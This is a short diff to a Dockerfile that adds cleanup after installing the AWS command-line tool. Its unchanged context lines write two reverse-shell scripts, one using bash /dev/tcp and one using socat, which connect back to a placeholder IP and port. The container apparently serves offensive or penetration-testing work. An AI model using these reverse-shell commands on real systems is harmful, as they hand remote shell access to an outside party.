@@ -19,7 +19,8 @@ apt-get -y install --no-install-recommends \
 
 RUN curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip" && \
   unzip awscliv2.zip && \
-  ./aws/install 
+  ./aws/install && \
+  rm -r aws && rm awscliv2.zip
 
 RUN echo "bash -i >& /dev/tcp/\${IP}/\${PORT} 0>&1" > reverse_shell.sh
 RUN echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:\${IP}:\${PORT}" > reverse_shell_socat.sh
